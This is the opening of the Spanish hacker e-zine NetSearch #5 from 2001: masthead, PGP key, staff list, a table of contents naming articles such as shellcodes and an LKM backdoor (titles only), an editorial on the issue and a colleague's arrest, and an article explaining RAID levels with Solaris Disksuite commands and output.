
       #######           ##  #######   [The NetSearch E-Zine #5]  ##
      ########          ##  ###                                   ###
      #### ##  ###### ##### #######  ######  ###### ##### ######  #######
     ####  ## ###  ##  ##    ###### ###  ## ###  ## ####  ##      ###  ##
     ###  ##  ####### ##        ### ####### ##   ## ##    ##      ###   ##
    ####  ## ##       ##       ### ##       ##   ## ##    ###     ###   ##
    #### ##  ####### ###### #####  ######   ######## ##   ####### ###   ##



		
			     -  Segunda Epoca  -
            +---------------------------------------------------+
            |    The NetSearch E-Zine - Numero V - Volumen I    |
            |                    02/03/2001                     |
            +---------------------------------------------------+

        	   - [ http://www.netsearch-ezine.com ] -
 


               "Know what I hate most?  Rhetorical questions."
                               -- Henry N. Camp
  


x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x

+----------------------------------------------------------------------------+
|									     |
| NOTA: Ninguno de los autores que han colaborado en este numero se hacen    |
|       responsables de los actos que algunas personas puedan cometer una    |
|       una vez hayan leido sus respectivos articulos.		             |
| 									     |
+----------------------------------------------------------------------------+

			           

 + INFORMACION ACERCA DE NETSEARCH


 - WEB OFICIAL:

		http://www.netsearch-ezine.com
                http://netsearch.page.to	 -> (redireccionador)     	
	
 - CANAL DE IRC:

                #netsearch , en el IRC-Hispano

 - MAILS OFICIALES:

	
	===========================================================
	==						         == 
	==       Editor     ->  editor@netsearch-ezine.com	 ==	
	==       Webmaster  ->  webmaster@netsearch-ezine.com    ==
	==	 Staff      ->  staff@netsearch-ezine.com        ==
	==							 ==
	===========================================================


 - DISTRIBUIDORES OFICIALES:

		http://www.vanhackez.com
		http://www.zine-store.com.ar
		

 - LLAVE PGP:

<++> llavesPGP/netsearch.asc $c47382c0f38094f037d2ec3326aee840
-----BEGIN PGP PUBLIC KEY BLOCK-----
Version: GnuPG v1.0.2 (GNU/Linux)
Comment: For info see http://www.gnupg.org

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
=PFmI
-----END PGP PUBLIC KEY BLOCK-----
<-->


 - STAFF:


        ===========================================================
        ==                                                       ==
	==     DarK_FeaR  ->  dark_fear@netsearch-ezine.com      ==
        ==     Sp4rK      ->  sp4rk@netsearch-ezine.com          ==
        ==     |CoDeX|    ->  codex@netsearch-ezine.com          ==
        ==     RaiSe      ->  raise@netsearch-ezine.com          ==  
        ==     cafo       ->  cafo@netsearch-ezine.com           ==
	==     QuasaR     ->  quasar@netsearch-ezine.com         ==
	==     PowR       ->  powr@netsearch-ezine.com           ==
	==     Pope       ->  pope@netsearch-ezine.com           ==
	==     MoebiuZ    ->  moebiuz@netsearch-ezine.com        ==
	==     kekabron   ->  kekabron@netsearch-ezine.com       ==
	==     Doing      ->  doing@netsearch-ezine.com          ==
        ==     MegadetH   ->  megadeth@netsearch-ezine.com       ==
        ==     HandeR     ->  hander@netsearch-ezine.com         ==
        ==     Chapulino  ->  chapulino@netsearch-ezine.com      ==
	==						         ==
        ===========================================================


 - COLABORADORES EN ESTE NUMERO:
	
	* RomLi       -   romli@eresmas.com
	* Papa Pile   -   papapile@hotmail.com
	* JohnnyG     -   johnny_g@usa.com 


 - SALUDOS:
   
	* A los e-zines de habla hispana
	* A los colaboradores de este numero
	* A toda la peña de #netsearch ;)


 - RECOMENDADO EL USO DEL EDIT DE MS-DOS O EL VIM DE LINUX



x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x


 + TOC


  +---------------------------------------------------------+---------------+
  |  FILE    |  SIZE  |           TITULO                    |     AUTOR     |
  |==========+========+=====================================+===============|
  | 0x00.txt |   9K   |   Indice                            |   NetSearch   |
  +----------+--------+-------------------------------------+---------------+
  | 0x01.txt |   5K   |   Editorial                         |   Editor      |
  +----------+--------+-------------------------------------+---------------+
  | 0x02.txt |  19K   |   Sistemas RAID                     |   HandeR      |
  +----------+--------+-------------------------------------+---------------+
  | 0x03.txt |  15K   |   El Registro de Windows            |   Chapulino   |
  +----------+--------+-------------------------------------+---------------+
  | 0x04.txt |  27K   |   Shellcodes en Linux/i386 (2)      |   RaiSe       |
  +----------+--------+-------------------------------------+---------------+
  | 0x05.txt |   4K   |   NetSearch al habla                |   NetSearch   |
  +----------+--------+-------------------------------------+---------------+
  | 0x06.txt |   8K   |   Reflexiones sobre los MIG         |   NEULK       |
  +----------+--------+-------------------------------------+---------------+
  | 0x07.txt |  11K   |   Seguridad en IPv6                 |   MegadetH    |
  +----------+--------+-------------------------------------+---------------+
  | 0x08.txt |  14K   |   Algoritmo Rijndael + IP Virtual   |   cafo        |
  +----------+--------+-------------------------------------+---------------+
  | 0x09.txt |   8K   |   En contacto con Guybrush          |   NetSearch   |
  +----------+--------+-------------------------------------+---------------+
  | 0x10.txt |  14K   |   Breves de NetSearch               |   Varios      |
  +----------+--------+-------------------------------------+---------------+
  | 0x11.txt |  25K   |   LKM: el backdoor perfecto         |   Doing       |
  +----------+--------+-------------------------------------+---------------+
  | 0x12.txt |  24K   |   Lenguaje C (1/2)                  |   JohnnyG     |
  +----------+--------+-------------------------------------+---------------+
  | 0x13.txt |  38K   |   Proyecto Echelon (2/2)            |   Pope        |
  +----------+--------+-------------------------------------+---------------+
  | 0x14.txt |  51K   |   Programacion segura en C          |   Sp4rK       |
  |          |        |   bajo Linux                        |               |
  +----------+--------+-------------------------------------+---------------+
  | 0x15.txt |   1K   |   Despedida                         |   Editor      |
  +----------+--------+-------------------------------------+---------------+
 


  		        - [ [ NetSearch Ezine #5 ] ] -


      ==================================================================
      ==  Para extraer los articulos del ezine en archivos separados  ==
      ==  ejecutar "./nextract -s ns005.txt"                          ==
      ==================================================================
	

                    - [ http://www.netsearch-ezine.com ] -





0x00

-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_


=-[ 0x01 ]-==================================================================
=-[ NetSearch Ezine #5 ]-====================================================
=-[ Editorial ]-=============================================================
=-[ por Editor ]-============================================================




Bueno, parece que estamos otra vez aqui :). Han pasado 3 meses y unos pocos
dias desde NS #4, y como veis hemos cumplido bastante bien nuestra promesa de
sacar el ezine cada 2/3 meses. Aunque que quereis que os diga?.. Lo hemos
estado pensando y hemos llegado a la conclusion de que para sacar un numero
en condiciones, el tiempo optimo seria de 4 meses. Ya se que puede parecer un
poco excesivo, pero asi se evitan las prisas y aceleraciones tipicas del
final. De esta forma conseguiriamos pulir unos cuantos detalles que, debido a
la urgencia de cumplir el plazo de los 3 meses, se nos escapan. Por lo tanto
lo mas seguro sera que a partir de ahora la cosa cambie, y en vez de 3 sera
de 4 meses aproximados el plazo de publicacion entre numero y numero.

Y bueno, hay varias cosas que os tengo q contar..

La primera es algo que, por desgracia, viene siendo habitual ultimamente en
nuestro pais. Y es que un colega nuestro ha sido detenido por la guardia
civil, otra vez mas, sin motivos.. Esta claro que la presuncion de inocencia
no se aplica a lo que delitos informaticos se refiere. Desde aqui queremos
mandarle un saludo y dedicarle este numero del ezine, ya que por culpa de
unos incompetentes (repito INCOMPETENTES) ha tenido que pasar por este mal
trago, sin tener el ninguna culpa. La verdad es que todo este asunto suena a
la tipica cabeza de turco, debe ser que se aburrian y van a por aquel que mas
'llama la atencion', y encima acusandole de algo que esta demostrado que es
falso, en fin.. Tienes todo nuestro apoyo [el sabe quien es ;)].

En fin..

Otra cosa que os tenia que contar es que se han producido nuevas
incorporaciones al staff. Para ser exactos se trata de HandeR, MegadetH y
Chapulino [bienvenidos ;)], haciendo un total de 14 los componentes del
mismo. Con esta cantidad consideramos que el numero necesario de personas
para que el NetSearch Ezine siga adelante esta cubierto, por lo tanto no
vamos aceptar nuevos miembros, al menos por el momento.. hombre, si hace una
donacion economica considerable se podria plantear al grupo a ver que opina
jeje ;).

Y poco mas que contar.. Para este numero no hemos podido mantener la seccion
'Bugs && Xploits', mas que nada por falta de tiempo. A decir verdad, cada vez
es mas dificil programar xploits, los programas vulnerables disminuyen dia a
dia. Es obvio que los programadores se han dado cuenta de esto y tienen mucho
mas cuidado a la hora escribir el codigo. De todas formas, intentaremos que
para NS #6 reaparezca este apartado.

Mas cosas..

La nueva seccion que se supone iba a aperecer en este numero, 'NetSearch
Mail/INBOX', se va a tener que retrasar tambien hasta NS #6, ya que hemos
recibido unos cuantos mails, pero no son suficientes.. Os recordamos que si
quereis preguntar algo podeis mandarnos un mail a: staff@netsearch-ezine.com,
y su respuesta sera comentada en dicha seccion por algun miembro del staff.

La seccion que si se estrena es la de 'Breves de NetSearch'. En dicha seccion
se incluiran articulos que, por su pequeño tamaño, no seran tratados como un
articulo 'completo'. Es decir, los textos de menos de 8k aproximadamente se
incluiran en ese apartado del ezine. Normalmente constara de 2 o 3 articulos. 
Mas informacion en 0x10 de este mismo numero.

Y ya que estamos con estremos tambien hemos actualizado la pagina web :). El
diseño is by Sp4rK, yo creo que ha quedado muy guapa. Solo un pequeño
comentario, la pagina no se ve bien con Netscape 4.x, por lo que si alguien
todavia usa esa antiguedad, a que espera para bajarse la version 6.x de
http://www.netscape.com ? ;). Como curiosidad la pagina si es compatible con
el navegador en modo texto lynx. Comentarios sobre la web de todo tipo:
webmaster@netsearch-ezine.com.

Bueno, yo creo que ya me estoy enrollando demasiado. Solo me queda saludar y
dar la enhorabuena a todos los miembros del staff y colaboradores externos,
gracias a ellos ya tenemos otro numero mas del NetSearch Ezine, un saludo
a todos y nos vemos en NS #6. Hasta pronto ;).


El Editor



0x00

-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_


=-[ 0x02 ]-==================================================================
=-[ NetSearch Ezine #5 ]-====================================================
=-[ Sistemas RAID ]-=========================================================
=-[ por HandeR ]-============================================================




	  +-------------------------------------------------+
	  |    (Redundant Array of independent Disks)	    |
	  |  (Arrays redundantes de discos independientes)  |
	  +-------------------------------------------------+




INDICE ----------------------------------------------------------

+ INTRODUCCION

+ NIVELES RAID
	- RAID 0
	- RAID 1
	- RAID 0+1
	- RAID 1+0
	- RAID 3 y 5

+ SOFTWARE RAID
	-Solstice Disksuite
	
+ DESPEDIDA



INTRODUCCION ----------------------------------------------------------

En un principio los primeros sistemas RAID fueron creados para para demostrar
como un sistema de este tipo era capaz de igualar o superar en rendimiento a
los enormes discos que se fabricaban antes, mientras que ahora utilizando
discos de pequeño tamaño, discos SCSI de unos 20Gb conseguimos varios Teras
de almacenamiento y con estupendas medidas de redundancia, mantenibilidad y
escalabilidad.

Todo esto conjugado con los modernos arrays que se fabrican nos dan unas
tasas de rendimiento y fiabilidad excelentes. La mayoria de los arrays que se
fabrican ahora nos brindan la posibilidad de disponer de casi todo su sistema
redundantes, desde las controladoras de sus discos, pasando por las fuentes
de alimentacion, hasta llegar a los interfaz de conexion con el sistema
(fibra , SCSI, ...).

Tanto los arrays de disco como el software de RAID optimizan las soluciones
para suplir las carencias de algunos de los RAID en cuanto a rendimiento, 
incluyendo memorias cache, procesadores para gestionarlos, ...
Todo esto y la posibilidad de cambiar los discos en caliente hacen que si 
en nuestro sistema se nos cae algun disco, simplemente cambiemos este en 
caliente por otro de las mismas caracteristicas y el array en pocos minutos 
este funcionando como si nada hubiera pasado.

Tampoco creais que hace falta gastarse un par millardos para tener un sistema
RAID, ultimamente estan saliendo muchas tarjetas que nos permiten el uso de
RAID en nuestro pequeño server de casa o ese server que le vamos a montar al
dueño de ese cyber que tiene un presupuesto moderado. Y si da la casualidad
que nos vamos a comprar un ekipo nuevo siempre podemos pensar en comprarnos
una placa que soporte RAID (no penseis que os va a hacer un super RAID 5
optimizado del carajo) por un precio que puede rondar las 30.000 pts. En mi
caso le he eshao ya el ojo a una Abit K7 Raid que me soporta RAID y discos de
ATA100 os copio las caracteristicas en cuanto a disco se refiere.

Ultra DMA 100

1. High Point HTP370 IDE Controller
2. Ultra DMA 100MB/Sec data transfer rate
3. RAID 0(stripping mode for boosting performance)
4. RAID 1 (mirroring mode for data security) 
5. RAID 0 +1(stripping and mirroring)


Por ultimo comentaros que los sistemas RAID nunca deben ser sustitutos de los
tradicionales backup (en cinta, cd-rom, etc...) que de tantos apuros nos han
sacado :) , Cada cosa tiene su funcion.

Empezamos la faena.



NIVELES RAID ----------------------------------------------------------

Existen Diferentes tipos de niveles de RAID alguno de ellos ya no se
utilizan:

+ RAID 0
+ RAID 1
+ RAID 1+0
+ RAID 0+1
+ RAID 2
+ RAID 3
+ RAID 4
+ RAID 5

La mayoria de ello combinan dos tecnicas (striping, mirroring) para realizar
el RAID en los discos, pasemos a describirlos con mas profundidad:




+--------+
| RAID 0 |
+--------+

Utiliza la tecnica de striping o concatenacion que se basa en utilizar varios
discos como de uno solo virtual se tratase, existen dos tipos de RAID 0 segun
la tecnica que apliquemos pasamos a describir las diferentes tecnicas


RAID 0 Concatenacion


 ---  Bloque 1
|   |
| 1 | 
|   |
 ---  Bloque 500
					 ---------   Bloque 1
 ---  Bloque 501			|	  |
|   |					|  Disco  |
| 2 |                        		|	  |
|   |					|	  |
 ---  Bloque 1000			| Virtual |
					|	  |
 ---  Bloque 1001			 ---------   Bloque 1500
|   |
| 3 |  
|   |
 ---  Bloque 1500
 
 
Como podemos apreciar en la ilustracion (cutre pero no veas er coñazo de jace
las putas rayitas RaiSe me vas a tene q pone un "altar" DIOS q paciencia :P)
partimos de 3 discos y los concatenamos de forma que el sistema lo vea como
uno solo.
 
 Caracteristicas
 
 	- No hay Redundancia de datos.
 	
 	- Espacio de direcciones contiguos.
 	
 Ventajas
 	
 	- Mejora en rendimiento I/O aleatorias, el rendimiento en cuanto a
 	  escritura es el mismo (este se hace de forma secuencial).
 	 
 	- Al no existir redundancia la capacidad de los discos se utiliza
          entera.
 	

 Inconvenientes

	- Si se pierde un disco perdemos los datos de todos los discos.
	
	- Al no existir redundancia cualquier fallo puede ser fatal.
	

 
RAID 0 Striping

Este sistema se basa al igual que el de mirroring en coger 2 o mas discos y
hacer que el sistema lo vea como uno solo pero con la variacion de que los
discos se dividen en segmentos llamados Stripe, los cuales se situan a lo
largo de todos los discos, estos stripes se intecalan en los discos para
mejorar la I/O.

Podemos jugar con el tamaño de los stripes segun nuestras necesidades, el
tamaño por defecto suele ser 64 Kbytes (Al menos en Volumen Manager :))


  Caracteristicas
  
  	- El espacio de direcciones esta segmentado.
  	
  	- No Existe Redundancia de discos.
  	
  	- Los stream se intercalan por los discos.
  	
  Ventajas
  
  	- Disponemos de toda la capacidad del Disco.
  	
  	- El rendimiento I/O se mejora tanto en peticiones secuenciales como
  	  aleatorias, gracias a la division en stripe.
  	  
  Inconvenientes
  
  	- Si perdemos un disco lo perdemos todo :(.
  	

 
 
+--------+
| RAID 1 |
+--------+

Se basa en la redundancia de datos para salvaguardar los mismos, el sistema
al igual que en los demas sistemas RAID lo trata como uno solo, teniendo asi
la informacion duplicada en ambos discos, algo necesario en sistemas de alta
fiabilidad y disponibilidad, ya que en caso de perdida de unos de los discos
el mirror se rompe y las aplicaiones continuan con el otro disco hasta que
restauremos el mirror.


 -------
|   P1  |			 
 -------			
|   P2  | Disco 1	         -------
 -------			|   1	|
|   P3  |			 -------
 -------			|   2	|  DISCO VIRTUAL 
				 -------
 -------			|   3	|
|   P1  |			 -------	
 -------			
|   P2  | Disco 2			 
 -------			
|   P3  |			 
 -------
 
 
  Caracteristicas

	- Redundancia total de los datos.
	
	- Mejora la lectura.
	
	
  Ventajas
  
  	- Copia redundante de los datos.
  	
  	- Si configuramos los discos de manera que se utilicen ambos para la
  	  lectura se aumenta el rendimiento en la escritura.
  	  
  
  Inconvenientes
  
  	- Se desperdicia en espacio un disco entero.
  	
  

  	
+----------+
| RAID 0+1 |
+----------+	

Bueno como supongo que os habreis dado cuenta que este RAID lo que busca es 
obtener el rendimiento que nos ofrece el RAID 0 y la fiabilidad del RAID 1
combinando estos dos tipos del RAID.

Supongo que con el grafico lo entenderemos mejor sobre todos los mas torpes
en estas cosas (date por aludido Hardcode xDD)


 --------
|   s1   |			 -------
 --------			|   s1	|
|   s3   |			 -------
 --------			|   s2	|
|   s5   |			 -------
 --------			|   s3	|
		STRIPING	 -------
 --------	 RAID 0		|   s4	|
|   s2   |			 -------	
 --------			|   s5	|			 -------
|   s4   |			 -------			|   s1	|
 --------			|   s6	|			 -------
|   s6   |			 -------			|   s2	|
 --------							 -------
								|   s3	|
						MIRRORING	 -------
						  RAID 1	|   s4	|
								 -------
 --------							|   s5	|
|   s1   |			 -------			 -------
 --------			|   s1	|			|   s6	|
|   s3   |			 -------			 -------
 --------			|   s2	|
|   s5   |			 -------
 --------			|   s3	|
		STRIPING	 -------
 --------	 RAID 0		|   s4	|
|   s2   |			 -------	
 --------			|   s5	|
|   s4   |			 -------
 --------			|   s6	|
|   s6   |			 -------
 --------
 

   Caracteristicas
   	
   		- Redundacia de los datos.
   		
   		- Mejora del rendimiento (gracias la RAID 0 y al striping).
   		
   
   Ventajas
   	
   		- Alta Fiabilidad al estar los datos totalmente redundantes.
   		
   		- Mejora del rendimiento.
   		

   Inconvenientes

		- Alto coste de instalacion, pierdes la mitad del espacio de 
		  almacenamiento para crear el mirroring.
	  
		  

		  
+----------+
| RAID 1+0 |
+----------+	

Igual que el RAID 0+1 conjuga las ventajas de ambos sistemas pero cambiando
el orden de los sistemas, con la ventaja que podemos tolerar una alta
tolerancia a fallos de disco (podemos incluso perder la mitad de los discos
sin que nuestras aplicaiones se dieran cuenta).



 --------
|   1s1  |			
 --------			
|   1s2  |			 -------
 --------			|  1s1	|
|   1s3  |			 -------
 --------			|  1s2	|
		MIRRORING	 -------
 --------	 RAID 1		|  1s3	|
|   1s1  |			 -------	
 --------							 -------
|   1s2  |			 				|  1s1	|
 --------							 -------
|   1s3  |			 				|  2s1	|
 --------							 -------
								|  1s2	|
						STRIPING	 -------
						 RAID 0		|  2s2	|
								 -------
 --------							|  1s3	|
|   2s1  |							 -------
 --------							|  2s3	|
|   2s2  |			 -------			 -------
 --------			|  2s1	|
|   2s3  |			 -------
 --------			|  2s2	|
		MIRRORING	 -------
 --------	 RAID 1		|  2s3	|
|   2s1  |			 -------	
 --------			
|   2s2  |			
 --------			
|   2s3  |			 
 --------
 



  Caracteristicas
  	
  		- Los mismos que RAID 0+1.

		- Soporta una tolerancia a fallos de discos mayor q RAID 0+1.
		
		
   Ventajas
   
   		- Tiene las mismas ventajas que RAID 0+1
   		
   		- Una alta tolerancia a fallos como podemos observar en la
   		  Ilustracion pueden incluso fallar 2 de los 4 utilizados
   		  para el RAID siempre que estos sean de diferente mirroring
   		  (si son del mismo las cagao, ya puedes ir buscando rapido
   		  el ultimo backup).
   		  
   Inconvenientes
   
		- Como cualquier sistema basado en RAID 1, penaliza en
		  50% la cantidad de disco que puede ser utilizado.
		  



+----------+
|  RAID 5  |
+----------+	

Los sistemas RAID 5 junto con los RAID 1+0 son los mas utilizados en lugares
donde el funcionamiento de nuestras maquinas es critico, sistemas en donde el
porcentaje de servicio ronda el 99,999% (unas 3 horas down al año).

Este sistema al igual que el RAID 3 y 4 se basa en realizar un striping de
los discos pero con la caracteristica de guardar tambien uno de los discos en
el caso de RAID 3 o repartidos por todos los discos en RAID 5 una informacion
de control a la que se le denomina paridad, que no es mas que una funcion OR
exclusiva (Boolean Exclusive OR) XOR.

Esta informacion nos servira si uno de los discos cae, entonces el RAID
reconstruira la informacion que tenia ese disco basandose en la funcion de
paridad y en el resto de los discos.

En RAID 5 podemos perder cualquiera de los discos puesto que la paridad esta
distribuida por los discos.

Pasamos a ver un esquemita de una implementacion en RAID 5


 --------------------------				 -------
|s1	s4	s7	 P | Disco 1			|   s1  |
 --------------------------				 -------
 							|   s2  |
 --------------------------				 -------
|s2	s5	P	s10| Disco 2			|   s3	|
 --------------------------				 -------
 					 RAID 5	=>	|   s4	|
 --------------------------				 -------
|s3	P	s8	s11| Disco 3			|   s5	|
 --------------------------				 -------
 							|   s6	|
 --------------------------				 -------
|P	s6	s9	s12| Disco 4			.
 --------------------------				.
 							.
 							
 							
 							
   Caracteristicas
   	
   		- Al Utilizar stripe mejoras las operaciones lectura.
   		
   		- Tenemos alta disponibilidad pero no con tal alto coste como
   		  con el mirroring.
   		  
   		- La paridad en RAID 3 y 4 estan en un disco en RAID 5 esta
   		  distribuida a lo largo de los discos.
   		  
   		  
   
   Ventajas
   	
   		- Nos permite el fallo de unos de los discos sin perder
		  el 50% de la capacidad de nuestro storage de 
		  almacenamiento.
   



   Inconvenientes
   
    		- Dependiendo de el software o Hardware que utilizemos para 
   		  implementar el RAID deberemos ajustarnos a un numero de 
   		  discos para realizar el array.
   		  
   		- No es buena solucion para sistemas en donde las operaciones
   		  de escrituras se realicen de forma intensiva.		  
   		
   		
En los sistemas en RAID 5 pueden realizarse incrementos en el rendimiento
estudiando las caracteristicas de nuestro sistemas (casi todos ellos basados
en la modificaciones del tamaño de los stripes).



SOFTWARE DE RAID ----------------------------------------------------------


Bueno para terminar os voy a comentar un poco el funcionamiento de un
software de RAID que nos permiten todas las configuraciones RAID que
queramos, la gran diferencia entre este y otros es su precio. Mientras uno
viene con la distribucion de Solaris otros como Volume Manager tendras que
desembolsar una bonita cantidad de dinero para poder utilizarlo (si es que no
se lo has podido sacar al comercial que te vendio el array :P).


+------------------+
|Soltice Disksuite |
+------------------+

Es una utilidad que viene con el sistema operativo Solaris (ojo no se instala
en la instalacion tipica y debes tener presente cuando vayas a instalar tu
Solaris que vas a utilizar este software). Soltice Disksuite es una utilidad
bastante potente tanto para gestionar un RAID en nuestro equipo como para un
arrays de disco (tarea algo mas complicada pero tb utilizado, para eso seria
mas recomendable el uso de SSVM Sun Storage Volume Manager u otro similar).

Disksuite usa discos virtuales para manipular los dispositivos fisicos, a
estos dispositivos los llama metadispositivos. Los metadispositivos estan
construidos de particiones y son totalmente transparentes para las
aplicaciones.

Este software utliza una base de datos para almacenar toda la informacion de
la configuracion de los discos, esta base de datos se llama MetaDB y debe
crearse en Disksuite, crearse y replicarse, porque es una informacion muy
muy importante, es mas deberia de replicarse en discos diferentes.

Dispone de las tipica interfaz X, que la lanzaremos desde la linea de
comandos con la orden:

metatool

Y a partir de ahi accederemos a todas las opciones del programa para crear 
concatenaciones de disco (RAID 0), mirrorings (RAID 1), RAID 5 , ...

En este enlace podras ver la pantalla inicial de Soltice Disksuite. En el
snap fijaros en lo que teneis que fijaros: en el DiskSuite!!!! no os
distraigais con otras cosas xDDD (Chui te la dedico jejeje) warrozzzzzzzzz

http://netsearch.page.to/raid.gif

A parte de la tipica interfaz X disponemos como siempre de la tipica interfaz
de comandos, comandos que podemos reconocer facilmente porque todos (creo
O_o) empiezan por meta aqui os paso los comandos:

root@hander:# meta
metaclear    metahs       metaonline   metareplace  metastat     metattach
metadb       metainit     metaparam    metaroot     metasync     
metadetach   metaoffline  metarename   metaset      metatool

Con los cuales podreis manipular todo el sistema. La orden metastat nos
muestra el estado del sistema de discos:

root@hander:# metastat 
d0: Mirror
    Submirror 0: d1
      State: Okay         
    Submirror 1: d2
      State: Okay         
    Pass: 1
    Read option: roundrobin (default)
    Write option: parallel (default)
    Size: 8392072 blocks

d1: Submirror of d0
    State: Okay         
    Size: 8392072 blocks
    Stripe 0:
        Device              Start Block  Dbase State        Hot Spare
        c0t0d0s0                   0     No    Okay         


d2: Submirror of d0
    State: Okay         
    Size: 8392072 blocks
    Stripe 0:
        Device              Start Block  Dbase State        Hot Spare
        c0t1d0s0                   0     No    Okay         


d3: Mirror
    Submirror 0: d4
      State: Okay         
    Submirror 1: d5
      State: Okay         
    Pass: 1
    Read option: roundrobin (default)
    Write option: parallel (default)
    Size: 22740112 blocks

d4: Submirror of d3
    State: Okay         
    Size: 22740112 blocks
    Stripe 0:
        Device              Start Block  Dbase State        Hot Spare
        c0t0d0s3                   0     No    Okay         


d5: Submirror of d3
    State: Okay         
    Size: 22740112 blocks
    Stripe 0:
        Device              Start Block  Dbase State        Hot Spare
        c0t1d0s3                   0     No    Okay         


d6: Mirror
    Submirror 0: d7
      State: Okay         
    Submirror 1: d8
      State: Okay         
    Pass: 1
    Read option: roundrobin (default)
    Write option: parallel (default)
    Size: 2101552 blocks

d7: Submirror of d6
    State: Okay         
    Size: 2101552 blocks
    Stripe 0:
        Device              Start Block  Dbase State        Hot Spare
        c0t0d0s5                   0     No    Okay         


d8: Submirror of d6
    State: Okay         
    Size: 2101552 blocks
    Stripe 0:
        Device              Start Block  Dbase State        Hot Spare
        c0t1d0s5                   0     No    Okay         
        
        
        
En esta salida del comando podemos ver como existen 3 mirrors que son d0, d3
y d6 con sus respectivas particiones, tamaños ...

De modo que el sistema lo veria de la siguente forma (suprimire la parte que
no nos interesa de la salida del comando para que no me riña er RaiSe por el
tema del los 80 caracteres :P )

root@hander:# mount
/ on /dev/md/dsk/d0  on Sat Dec  2 22:06:08 2000
/proc on /proc  on Sat Dec  2 22:06:06 2000
/dev/fd on fd  on Sat Dec  2 22:06:10 2000
/etc/mnttab on mnttab on Sat Dec  2 22:06:14 2000
/var on /dev/md/dsk/d3 3 on Sat Dec  2 22:06:15 2000
/var/run on swap  on Sat Dec  2 22:06:15 2000
/tmp on swap  on Sat Dec  2 22:06:17 2000
/export/home on /dev/md/dsk/d6 on Sat Dec  2 22:06:17 2000
/contri on /dev/md/news/dsk/d0  on Tue Dec  5 13:08:01 2000

Bueno creo que como introduccion a Solstice Disksuite ya vale, 
